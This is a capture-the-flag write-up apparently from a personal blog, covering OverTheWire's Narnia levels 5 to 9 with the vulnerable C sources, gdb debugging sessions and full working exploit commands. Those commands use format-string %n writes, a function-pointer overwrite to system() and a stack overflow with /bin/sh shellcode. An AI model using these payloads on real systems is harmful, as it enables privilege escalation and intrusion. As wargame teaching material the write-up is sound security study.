---
layout: post
title:  "Narnia 5 - 9 (OverTheWire CTF Writeup)"
date:   2020-09-23 08:00:00 +0100
categories: writeup Hacker101 
---

This is the second part Of OverTheWire's Narnia CTF Writeup covering all the final levels from 5 to 9. Let's start!

# *Narnia5*
Let's start off by taking a look to the source code:

{% highlight c %}
#include <stdio.h>
#include <stdlib.h>
#include <string.h>

int main(int argc, char **argv){
        int i = 1;
        char buffer[64];

        snprintf(buffer, sizeof buffer, argv[1]);
        buffer[sizeof (buffer) - 1] = 0;
        printf("Change i's value from 1 -> 500. ");

        if(i==500){
                printf("GOOD\n");
        setreuid(geteuid(),geteuid());
                system("/bin/sh");
        }

        printf("No way...let me give you a hint!\n");
        printf("buffer : [%s] (%d)\n", buffer, strlen(buffer));
        printf ("i = %d (%p)\n", i, &i);
        return 0;
}
{% endhighlight %}
So here the argument passed to the program is copyed in a 64 bytes long buffer but this time the size is checked. What this means is no Buffer Overflow this time, however this program i subject to another known vulnerability: [format strings](https://en.wikipedia.org/wiki/Uncontrolled_format_string). Because of the incorrect use of the `snprintf` function (which btw is like printf but prints to a buffer intead of stdout) our input is formated accoring to the `convertion specifiers`. Let's see what this looks like.
```
narnia5@narnia:/narnia$ ./narnia5 AAA
Change i's value from 1 -> 500. No way...let me give you a hint!
buffer : [AAA] (3)
i = 1 (0xffffd6e0)
narnia5@narnia:/narnia$ ./narnia5 AAA%x%p
Change i's value from 1 -> 500. No way...let me give you a hint!
buffer : [AAAf74141410x34313437] (21)
i = 1 (0xffffd6e0)
```
First we write `AAA` in our buffer and everything works as expected but on the second try we also try to write `%x` and `%p` which are special characters for the sprintf function. The vulnerable function will take any following arguments and print it's hex value. Because there isn't any passed argument in the source code the function will start reading memory from the stack. Let's try this again.
```
narnia5@narnia:/narnia$ ./narnia5 %x.%x.%x.%x.%x.%x.%x.%x.%x
Change i's value from 1 -> 500. No way...let me give you a hint!
buffer : [f7fc5000.30303035.3330332e.33303330.33332e35.33333033.332e6532.] (63)
i = 1 (0xffffd6d0)
```
what we are doing here is reading arbitrary memory from the stack. Let's do some debugging with `gdb`
```
(gdb) disas main 
Dump of assembler code for function main:                                                                                                                                                                   
   0x0804850b <+0>:     push   %ebp                                                                                                                                                                         
   0x0804850c <+1>:     mov    %esp,%ebp                                                                                                                                                                    
  [...] output trimmed                                                                                                                                                              
   0x0804851f <+20>:    mov    (%eax),%eax                                                                                                                                                                  
   0x08048521 <+22>:    push   %eax                                                                                                                                                                         
   0x08048522 <+23>:    push   $0x40                                                                                                                                                                        
   0x08048524 <+25>:    lea    -0x48(%ebp),%eax                                                                                                                                                             
   0x08048527 <+28>:    push   %eax                                                                                                                                                                         
   0x08048528 <+29>:    call   0x80483f0 <snprintf@plt>                                                                                                                                                     
   0x0804852d <+34>:    add    $0xc,%esp                                                                                                                                                                    
   0x08048530 <+37>:    movb   $0x0,-0x9(%ebp)
   0x08048534 <+41>:    push   $0x8048650
  [...]
(gdb) b * 0x0804852d
Breakpoint 1 at 0x804852d
(gdb) run AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA
Starting program: /narnia/narnia5 AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA

Breakpoint 1, 0x0804852d in main ()
(gdb) x/10xw $esp
0xffffd634:     0xffffd640      0x00000040      0xffffd86b      0x41414141
0xffffd644:     0x41414141      0x41414141      0x41414141      0x41414141
0xffffd654:     0x41414141      0x41414141
(gdb) x/s 0xffffd86b
0xffffd86b:     'A' <repeats 46 times>
```

Ok, so we set a breakpoint just after `snprintf` finished executing. We can observe that the stack contains the variable we just passed to it. The start of the buffer (Now filled with 0x41) , the buffer length in hex (0x40 = 64) and a pointer to a string in memory (*Argv). The important part is that the buffer follows the arguments and so when using `%x` it will read from the string we passed as argument.
To get a shell we need to overwrite the i variable with a value of 500. Ok here is the trick. The `%n` modifier is a special one in the sense that it writes in memory instead of reading from it. It Takes the next argument in the list and writes the number of bytes outputted so far in there. To exploit this we need to:
- Inject a first argument of 4 bytes `JUNK`
- Inject the address of variable i (The program outputs it)
- 8 bytes are already in buffer now, using the modyfier `%492x` will write another 500 and consume the first `JUNK` argument
- %n modifier now writes the value 500 in the address of the second injected argument (i variable)

Let's see this in action: (I used bash command substitution to pass the arguments)
```
narnia5@narnia:/narnia$ ./narnia5 $(python -c "print('JUNK'+'\xe0\xd6\xff\xff')")%492x%n
Change i's value from 1 -> 500. No way...let me give you a hint!
buffer : [JUNK                                                       ] (63)
i = 1 (0xffffd6d0)
narnia5@narnia:/narnia$ ./narnia5 $(python -c "print('JUNK'+'\xd0\xd6\xff\xff')")%492x%n
Change i's value from 1 -> 500. GOOD
$ whoami
narnia6
$ cat /etc/narnia_pass/narnia6
**********
```
We do a quick test to check `i`'s address and then we attack! Nice.

# *Narnia6*
Source time!
{% highlight c %}
#include <stdio.h>
#include <stdlib.h>
#include <string.h>

extern char **environ;

// tired of fixing values...
// - morla
unsigned long get_sp(void) {
       __asm__("movl %esp,%eax\n\t"
               "and $0xff000000, %eax"
               );
}

int main(int argc, char *argv[]){
        char b1[8], b2[8];
        int  (*fp)(char *)=(int(*)(char *))&puts, i;

        if(argc!=3){ printf("%s b1 b2\n", argv[0]); exit(-1); }

        /* clear environ */
        for(i=0; environ[i] != NULL; i++)
                memset(environ[i], '\0', strlen(environ[i]));
        /* clear argz    */
        for(i=3; argv[i] != NULL; i++)
                memset(argv[i], '\0', strlen(argv[i]));

        strcpy(b1,argv[1]);
        strcpy(b2,argv[2]);
        //if(((unsigned long)fp & 0xff000000) == 0xff000000)
        if(((unsigned long)fp & 0xff000000) == get_sp())
                exit(-1);
        setreuid(geteuid(),geteuid());
    fp(b1);

        exit(1);
}
{% endhighlight %}

Here we have 2 buffers of 8 bytes each and beacuse of the insecure strcpy we can overflow both of them. Overwriting the `*fp` function pointer leads to arbitrary code execution but we can't execute code on the stack due to the fancy checks and the `get_sp` assembly function. When the fp function is called, the content of buffer `b1` is passed to it. Let's do some gdb magic.
```
(gdb) disas main
	[...] 
   0x080486e4 <+316>:   mov    -0xc(%ebp),%eax
   0x080486e7 <+319>:   call   *%eax
   0x080486e9 <+321>:   add    $0x4,%esp
   0x080486ec <+324>:   push   $0x1
   0x080486ee <+326>:   call   0x8048440 <exit@plt>
End of assembler dump.
(gdb) b *0x080486e7
Breakpoint 1 at 0x80486e7

(gdb) run AAAAAAAACC BBBBBBBB
The program being debugged has been started already.
Start it from the beginning? (y or n) y
Starting program: /narnia/narnia6 AAAAAAAACC BBBBBBBB

Breakpoint 1, 0x080486e7 in main ()
(gdb) x/10xw $esp
0xffffd688:     0xffffd694      0x42424242      0x42424242      0x41414100
0xffffd698:     0x41414141      0x08004343      0x00000003      0x00000000
0xffffd6a8:     0x00000000      0xf7e2a286
(gdb) c
Continuing.

Program received signal SIGSEGV, Segmentation fault.
0x08004343 in ?? ()

```
As you can see the second buffer is located priot in memory (0x42424242) followed by the first one. We also know that immediatly after the second buffer in memory the fp pointer is stored because we get a `segv` by overwriting it.
> `[8bytes second arg][8bytes first arg][fp pointer]`
 
To exploit this we need to use an already existing function, and what's better than `system()`?
```
(gdb) info functions system
All functions matching regular expression "system":

Non-debugging symbols:
0xf7e4c850  __libc_system
0xf7e4c850  system
0xf7f25c60  svcerr_systemerr
(gdb) 
```
Now we know it's address in memory (0xf7e4c850). The argument used for its call is whatever is found in the second 8 bytes buffer in memory.
```
narnia6@narnia:/narnia$ ./narnia6 AAAAAAAA$(python -c "print('\x50\xc8\xe4\xf7')") AAAAAAAA/bin/sh
$ whoami
narnia7
$ cat /etc/narnia_pass/narnia7
**********
```
Here we first overwrite the function pointer using the second buffer in memory (first arg) and then we place the string `/bin/sh` in the second buffer again. We can't do this using a single overwrite because we need the null pointer after the string we want to execute. Job done!

# *Narnia 7*
Here's the source:
{% highlight c %}
#include <stdio.h>                                                                                                                                                                     
#include <stdlib.h>                                                                                                                                                                    
#include <string.h>                                                                                                                                                                    
#include <stdlib.h>                                                                                                                                                                    
#include <unistd.h>                                                                                                                                                                    
                                                                                                                                                                                       
int goodfunction();                                                                                                                                                                    
int hackedfunction();                                                                                                                                                                  
                                                                                                                                                                                       
int vuln(const char *format){                                                                                                                                                          
        char buffer[128];                                                                                                                                                              
        int (*ptrf)();

        memset(buffer, 0, sizeof(buffer));
        printf("goodfunction() = %p\n", goodfunction);
        printf("hackedfunction() = %p\n\n", hackedfunction);

        ptrf = goodfunction;
        printf("before : ptrf() = %p (%p)\n", ptrf, &ptrf);

        printf("I guess you want to come to the hackedfunction...\n");
        sleep(2);
        ptrf = goodfunction;

        snprintf(buffer, sizeof buffer, format);

        return ptrf();
}

int main(int argc, char **argv){
        if (argc <= 1){
                fprintf(stderr, "Usage: %s <buffer>\n", argv[0]);
                exit(-1);
        }
        exit(vuln(argv[1]));
}

int goodfunction(){
        printf("Welcome to the goodfunction, but i said the Hackedfunction..\n");
        fflush(stdout);

        return 0;
}

int hackedfunction(){
        printf("Way to go!!!!");
            fflush(stdout);
        setreuid(geteuid(),geteuid());
        system("/bin/sh");

        return 0;
}
{% endhighlight %}

It's a longer code than the previous ones, but we have a hint here. The vulnerable function is called `vuln`, so it's pretty obvious we have to investigate it. Essentially we have another format string vulnerability (see Narnia5) but this time we have to redirect the execution by overwriting a function pointer. We want to put the address of `hackedfunction` in the `ptrf` variable. When the function will be called we get a shell. So how can we do this?
```
(gdb) disas vuln
	[...]
   0x080486ac <+145>:   push   %eax
   0x080486ad <+146>:   call   0x8048500 <snprintf@plt>
   0x080486b2 <+151>:   add    $0xc,%esp
   0x080486b5 <+154>:   mov    -0x84(%ebp),%eax
   0x080486bb <+160>:   call   *%eax
   0x080486bd <+162>:   leave
   0x080486be <+163>:   ret
End of assembler dump.
(gdb) b *0x080486ad
Breakpoint 1 at 0x80486ad
(gdb) b *0x080486b2
Breakpoint 2 at 0x80486b2
(gdb) run AAAABBBB
Starting program: /narnia/narnia7 AAAABBBB
goodfunction() = 0x80486ff
hackedfunction() = 0x8048724

before : ptrf() = 0x80486ff (0xffffd628)
I guess you want to come to the hackedfunction...

Breakpoint 1, 0x080486ad in vuln ()
(gdb) x/10xw $esp
0xffffd61c:     0xffffd62c      0x00000080      0xffffd893      0x080486ff
0xffffd62c:     0x00000000      0x00000000      0x00000000      0x00000000
0xffffd63c:     0x00000000      0x00000000

(gdb) c
Continuing.

Breakpoint 2, 0x080486b2 in vuln ()
(gdb) x/10xw $esp
0xffffd61c:     0xffffd62c      0x00000080      0xffffd893      0x080486ff
0xffffd62c:     0x41414141      0x42424242      0x00000000      0x00000000
0xffffd63c:     0x00000000      0x00000000
(gdb) x/s 0xffffd893
0xffffd893:     "AAAABBBB"

```
Breakpoints are set right before and after the execution of `snprinf`. So the stack is structured this way now :
>[first arg to snprintf][second arg to snprintf][third arg to snprintf][4 bytes unknown stuff][input controlled buffer]

On execution we get `hackedfunction`' and `ptrf`'s address but how can we ovverride `ptrf` now?
```
narnia7@narnia:/narnia$ ./narnia7 $(python -c "print('\x48\xd6\xff\xff')")%134514464x%n
goodfunction() = 0x80486ff
hackedfunction() = 0x8048724

before : ptrf() = 0x80486ff (0xffffd648)
I guess you want to come to the hackedfunction...
Way to go!!!!$ whoami
narnia8
$ cat /etc/narnia_pass/narnia8
**********
```
The address of `hackedfunction` (0x8048724) is equal to 134514468 in decimal. We write in our input controlled buffer the address of `ptrf` and then the remaining 134514464 bytes using the `%x` modifier. This also consumes the 4 bytes unknown stuff as an argument. Next argument in memory is the just written pointer to `ptrf`. Using a `%n` will now write the hex number `0x8048724` in `ptrf` redirecting execution as intended. 

# *Narnia8*
SOOOURCE PLEASE
{% highlight c %}
#include <stdio.h>
#include <stdlib.h>
#include <string.h>
// gcc's variable reordering fucked things up
// to keep the level in its old style i am
// making "i" global until i find a fix
// -morla
int i;

void func(char *b){
        char *blah=b;
        char bok[20];
        //int i=0;

        memset(bok, '\0', sizeof(bok));
        for(i=0; blah[i] != '\0'; i++)
                bok[i]=blah[i];

        printf("%s\n",bok);
}

int main(int argc, char **argv){

        if(argc > 1)
                func(argv[1]);
        else
        printf("%s argument\n", argv[0]);

        return 0;
}
{% endhighlight %}
Ooook, I struggled a lot with this one. I will try to show you how I debugged this and what I tried. At first it seemd to me like a Classic buffer overflow. Our input will be entirely copied into `bok` buffer so I instantly tried injecting some shellcode and overwrite the return address. Obviously it didn't work. Let's start gdb to see what's going on.
```
(gdb) disas func                                                                                                                                                                       
Dump of assembler code for function func:                                                                                                                                              
   0x0804841b <+0>:     push   %ebp                                                                                                                                                    
   0x0804841c <+1>:     mov    %esp,%ebp                                                                                                                                               
   0x0804841e <+3>:     sub    $0x18,%esp                                                                                                                                              
   0x08048421 <+6>:     mov    0x8(%ebp),%eax                                                                                                                                          
   0x08048424 <+9>:     mov    %eax,-0x4(%ebp)                                                                                                                                         
   0x08048427 <+12>:    push   $0x14                                                                                                                                                   
   0x08048429 <+14>:    push   $0x0                                                                                                                                                    
   0x0804842b <+16>:    lea    -0x18(%ebp),%eax                                                                                                                                        
   0x0804842e <+19>:    push   %eax                                                                                                                                                    
   0x0804842f <+20>:    call   0x8048300 <memset@plt>                                                                                                                                  
   0x08048434 <+25>:    add    $0xc,%esp                                                                                                                                               
   0x08048437 <+28>:    movl   $0x0,0x80497b0                                                                                                                                          
   0x08048441 <+38>:    jmp    0x8048469 <func+78>                                                                                                                                     
   0x08048443 <+40>:    mov    0x80497b0,%eax                                                                                                                                          
   0x08048448 <+45>:    mov    0x80497b0,%edx                                                                                                                                          
   0x0804844e <+51>:    mov    %edx,%ecx                                                                                                                                               
   0x08048450 <+53>:    mov    -0x4(%ebp),%edx                                                                                                                                         
   0x08048453 <+56>:    add    %ecx,%edx                                                                                                                                               
   0x08048455 <+58>:    movzbl (%edx),%edx                                                                                                                                             
   0x08048458 <+61>:    mov    %dl,-0x18(%ebp,%eax,1)                                                                                                                                  
   0x0804845c <+65>:    mov    0x80497b0,%eax                                                                                                                                          
   0x08048461 <+70>:    add    $0x1,%eax                                                                                                                                               
   0x08048464 <+73>:    mov    %eax,0x80497b0                                                                                                                                          
   0x08048469 <+78>:    mov    0x80497b0,%eax                                                                                                                                          
   0x0804846e <+83>:    mov    %eax,%edx                                                                                                                                               
   0x08048470 <+85>:    mov    -0x4(%ebp),%eax                                                                                                                                         
   0x08048473 <+88>:    add    %edx,%eax                                                                                                                                               
   0x08048475 <+90>:    movzbl (%eax),%eax                                                                                                                                             
   0x08048478 <+93>:    test   %al,%al                                                                                                                                                 
   0x0804847a <+95>:    jne    0x8048443 <func+40>
   0x0804847c <+97>:    lea    -0x18(%ebp),%eax
   0x0804847f <+100>:   push   %eax
   0x08048480 <+101>:   push   $0x8048550
   0x08048485 <+106>:   call   0x80482e0 <printf@plt>
   0x0804848a <+111>:   add    $0x8,%esp
   0x0804848d <+114>:   nop
   0x0804848e <+115>:   leave
   0x0804848f <+116>:   ret
End of assembler dump.
(gdb) b *0x08048475
(gdb) b *0x08048475
Breakpoint 1 at 0x8048475
```
I tried to find the instruction insiede the loop in the disassembled function and set a breakpoint there.
```
(gdb) run AAAABBBBCCCCDDDDEEEEFFFF                                                                                                                                                     
Starting program: /narnia/narnia8 AAAABBBBCCCCDDDDEEEEFFFF                                                                                                                             
                                                                                                                                                                                       
Breakpoint 1, 0x08048475 in func ()                                                                                                                                                    
(gdb) x/10xw $esp                                                                                                                                                                      
0xffffd684:     0x00000000      0x00000000      0x00000000      0x00000000                                                                                                             
0xffffd694:     0x00000000      0xffffd883      0xffffd6a8      0x080484a7                                                                                                             
0xffffd6a4:     0xffffd883      0x00000000                                                                                                                                             
(gdb) c                                                                                                                                                                                
Continuing.                                                                                                                                                                            
                                                                                                                                                                                       
Breakpoint 1, 0x08048475 in func ()                                                                                                                                                    
(gdb) x/10xw $esp                                                                                                                                                                      
0xffffd684:     0x00000041      0x00000000      0x00000000      0x00000000                                                                                                             
0xffffd694:     0x00000000      0xffffd883      0xffffd6a8      0x080484a7                                                                                                             
0xffffd6a4:     0xffffd883      0x00000000                                                                                                                                             
(gdb) c                                                                                                                                                                                
Continuing.                                                                                                                                                                            
                                                                                                                                                                                       
Breakpoint 1, 0x08048475 in func ()                                                                                                                                                    
[continuing another 18 times here]
(gdb)
Continuing.

Breakpoint 1, 0x08048475 in func ()
(gdb) x/10xw $esp
0xffffd684:     0x41414141      0x42424242      0x43434343      0x44444444
0xffffd694:     0x45454545      0xffffd883      0xffffd6a8      0x080484a7
0xffffd6a4:     0xffffd883      0x00000000
(gdb) x/s 0xffffd883
0xffffd883:     "AAAABBBBCCCCDDDDEEEEFFFF"
(gdb) c
Continuing.

Breakpoint 1, 0x08048475 in func ()
(gdb) x/10xw $esp
0xffffd684:     0x41414141      0x42424242      0x43434343      0x44444444
0xffffd694:     0x45454545      0xffffd846      0xffffd6a8      0x080484a7
0xffffd6a4:     0xffffd883      0x00000000
(gdb) x/s 0xffffd846
0xffffd846:     ""
(gdb) c
Continuing.

Breakpoint 1, 0x08048475 in func ()
(gdb) x/10xw $esp
0xffffd684:     0x41414141      0x42424242      0x43434343      0x44444444
0xffffd694:     0x45454545      0xffff7546      0xffffd6a8      0x080484a7
0xffffd6a4:     0xffffd883      0x00000000
(gdb) c
Continuing.
AAAABBBBCCCCDDDDEEEEFu
[Inferior 1 (process 18538) exited normally]
```
I know it's a lot of stuff here. After I set the breakpoint I executed with a 24 Bytes long input (4 bytes more than the allowed) and then stepped one assigment at a time. Each time I esamined the stack and you can see our values slowly written there (0x41,0x42,0x43...) At some point we overwrite an address in memory. Inspecting it shows us... It's the address to out input buffer! This means we are overwriting it causing it to stop the loop because it can't find a string anymore in a random address. The return address is just another 4 bytes away. (at 0xffffd6a0 in this case)
I tried a lot of things here. The plan is to control the return address but carefully overwrite the memory to keep the buffer pointer intact. Something like this:
>[20 times A][string pointer][4 bytes junk][return address][shellcode]

```
(gdb) run $(python -c "print('A'*20+'\x46\xd8\xff\xff'+'JUNK'+'\xa4\xd6\xff\xff'+'\x90'*50+
'\x31\xc0\x50\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\x89\xc1\x89\xc2\xb0\x0b\xcd\x
80\x31\xc0\x40\xcd\x80')")
Starting program: /narnia/narnia8 $(python -c "print('A'*20+'\x46\xd8\xff\xff'+'JUNK'+'\xa4\xd6\xff\xff'+'\x90'*50+'\x31\xc0\x50\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\x89\xc1\x89\xc2\xb0\x0b\xcd\x80\x31\xc0\x40\xcd\x80')")
AAAAAAAAAAAAAAAAAAAAF-
[Inferior 1 (process 18707) exited normally]
(gdb) 
```
Wait...what? No shell and no SEGV either. The problem is that the address are changing due to the variable length of the input. We can precicely calculate it inside of gdb but it would be useless because outside of it they are changing again. Let's step out of gdb.
What i ended up doing was bruteforcing it with a bash loop. The exact address won't move too much probably an stay in the range of 255 bytes. Even if we had to bruteforce two bytes it would be still possible.
```
narnia8@narnia:/narnia$ for i in {0..255}                                                                                                                                              
> do ./narnia8 $(python -c "print('A'*20+chr($i)+'\xd8\xff\xff'+'JUNK'+'\xa4\xd6\xff\xff'+'\x90'*50+'\x31\xc0\x50\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\x89\xc1\x89\xc2\xb0\x
0b\xcd\x80\x31\xc0\x40\xcd\x80')")                                                                                                                                                     
> done
-bash: warning: command substitution: ignored null byte in input                                                                                                                       
AAAAAAAAAAAAAAAAAAAL                                                                                                                                                                   
AAAAAAAAAAAAAAAAAAAK                                                                                                                                                                   
AAAAAAAAAAAAAAAAAAAK                                                                                                                                                                   
AAAAAAAAAAAAAAAAAAAAK                                                                                                                                                                  
AAAAAAAAAAAAAAAAAAAK                                                                                                                                                                   
Segmentation fault                                                                                                                                                                     
Segmentation fault                                                                                                                                                                     
AAAAAAAAAAAAAAAAAAAK                                                                                                                                                                   
AAAAAAAAAAAAAAAAAAKA                                                                                                                                                                   
AAAAAAAAAAAAAAAAAAAAK                                                                                                                                                                  
AAAAAAAAAAAAAAAAAAAAK                                                                                                                                                                  
AAAAAAAAAAAAAAAAAAAA                                                                                                                                                                   
                   K                                                                                                                                                                   
AAAAAAAAAAAAAAAAAAAA                                                                                                                                                                   
                   K                                                                                                                                                                   
KAAAAAAAAAAAAAAAAAAA                                                                                                                                                                   
AAAAAAAAAAAAAAAAAAAK                                                                                                                                                                   
AAAAAAAAAAAAAAAAAAAK
[...] output trimmed
AAAAAAAAAAAAAAAAAAAADK
AAAAAAAAAAAAAAAAAAAAEK
AAAAAAAAAAAAAAAAAAAAFK
AAAAAAAAAAAAAAAAAAAAGK
AAAAAAAAAAAAAAAAAAAAHK
AAAAAAAAAAAAAAAAAAAAIK
AAAAAAAAAAAAAAAAAAAAJK
AAAAAAAAAAAAAAAAAAAAKJUNK1Ph//shh/bin°
                                      ̀1@̀
$ whoami
narnia9
$ cat /etc/narnia_pass/narnia9
**********
```
Crazy! At some point we get a shell. We actually got lucky here because the return address we overwrote jumped into the shellcode, but with the `NOP` sled this would be also easily guessable.

# *Narnia9*
Let's start off by printing the source code like always
```
narnia9@narnia:~$ cd /narnia
narnia9@narnia:/narnia$ cat narnia9.c
cat: narnia9.c: No such file or directory
```
No source? Let's check the home directory
```
narnia9@narnia:/narnia$ cd
narnia9@narnia:~$ ls
CONGRATULATIONS
narnia9@narnia:~$ cat CONGRATULATIONS 
you are l33t! next plz...
```
So there is no challenge here we already succesfully completed the Narnia Warzone! P.s Follow me on Twitter ;D
